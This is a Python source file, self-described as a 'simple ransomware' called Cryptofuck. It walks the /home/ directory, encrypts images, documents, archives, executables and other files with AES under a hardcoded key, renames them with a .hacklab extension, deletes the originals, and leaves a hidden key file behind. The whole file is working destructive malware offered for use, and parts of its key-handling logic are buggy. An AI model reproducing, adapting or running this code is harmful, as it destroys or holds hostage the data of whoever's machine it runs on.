#!/usr/bin/python


# Cryptofuck: it's a simple ransomware coded using pycrypto module in python 
# coded by Bingo 
# twitter: @hack1lab 
# fb.me/hack1lab, fb.me/bing00o
# https://github.com/mohamed1lar/
# https://hack1lab.blogspot.com/


from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
from sys import stdout
import base64, os
import random
import os.path


#change this key with your key, remember the key must be base64 encode
key = "aGFja2xhYg=="

class colors:
        def __init__(self):
                self.blue = "\033[94m"
                self.red = "\033[91m"
                self.end = "\033[0m"
cl = colors()


def getkey(password):
	hasher = SHA256.new(password.encode('utf-8'))
	return hasher.digest()



# def write(word):
# 	stdout.write(word+"                                         \r")
# 	stdout.flush()
# 	return True



def encrypt(key, filename):
	chunksize = 64*1024
	outputFile = str(filename)+".hacklab"
	filesize = str(os.path.getsize(filename)).zfill(16)
	IV = Random.new().read(16)

	encryptor = AES.new(key, AES.MODE_CBC, IV)
	try:
		with open(filename, 'rb') as infile:
			with open(outputFile, 'wb') as outfile:
				outfile.write(filesize.encode('utf-8'))
				outfile.write(IV)

				while True:
					chunk = infile.read(chunksize)

					if len(chunk) == 0:
						break 
					elif len(chunk) % 16 != 0:
						chunk += b' ' * (16 - (len(chunk) % 16))

					outfile.write(encryptor.encrypt(chunk))
	except IOError:
		pass






searche2 = list(Path('/home/').glob('**/*.txt'))

FileLocation = ""

for File in searche2:
	File = str(File)
	if File.endswith(".KeyToUnlock.txt"):
		FileLocation = File
	else:
		pass
# print(x)



string = ''.join(
random.choice('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890') for i in range(12))
print("TESTING THE STRING TESTING THE STRING")
print(string)
print("ENCODED STRING")
encoded = base64.b64decode(string)
string = encoded
searche1 = list(Path('/home/').glob('**/*'))
randomDirectory = random.choice(searche1)
randomDirectory = str(randomDirectory)
name = randomDirectory.split("/")[-1]
path = randomDirectory.replace(name, "")
print("RANDOM DIRECTORY IS:")
print(path)

if FileLocation == "":
	print("NO KEY FILE FOUND! INJECTING KEY")
	# create a hidden txt file with the key in it

	# key = string

	name = ".KeyToUnlock"

	completeName = os.path.join(path, name + ".txt")

	file1 = open(completeName, "w")

	toFile = key

	file1.write(toFile)

	file1.close()

else:
	print("FOUND THE FILE FOUND THE FILE! READING READING READING")

	file_name = FileLocation.split("/")[-1]
	file_path = FileLocation.replace(file_name, "")
	completeName = os.path.join(file_path, file_name)

	print("FILE IS FOUND AT: ")
	print(file_path)
	file1 = open(FileLocation, "r")
	print("KEY FOUND IS:")
	# key = ''.join(file1.readlines())
	print(''.join(file1.readlines()))
	# print(file1.readlines())
	key = ''.join(file1.readlines())
	file1.close()






list_f = []


#extensions list
extensions = ['jpg', 'png', 'jpeg', 'iso','exe', 'mp3', "mp4", 'zip', 'rar', 'txt', 'iso', 'h', 'word', 'doc', 'docx', 'PNG']





for extension in extensions:
	try:

		searche = list(Path('/home/').glob('**/*.{}'.lower().format(extension)))


		for File in searche:
			File = str(File)
			# temp = str(File).lower()
			if (File.endswith(".hacklab") | File.endswith("KeyToUnlock.txt")):
				pass
			else:
				# x = File.split("/")[-1]
				list_f.append(File)
				# print(x)
	except OSError:
		print("you must be root !")

# print(list_f)


for i in list_f:

		file_name = i.split("/")[-1]
		file_path = i.replace(file_name, "")

		# word = cl.blue+"Encryption: "+cl.end+str(file_name)
		# write(word)

		os.chdir(file_path)
		encrypt(getkey(base64.b64decode(key)), file_name)
		try:
			os.remove(file_name)
		except OSError:
			pass

print("\n* Done *")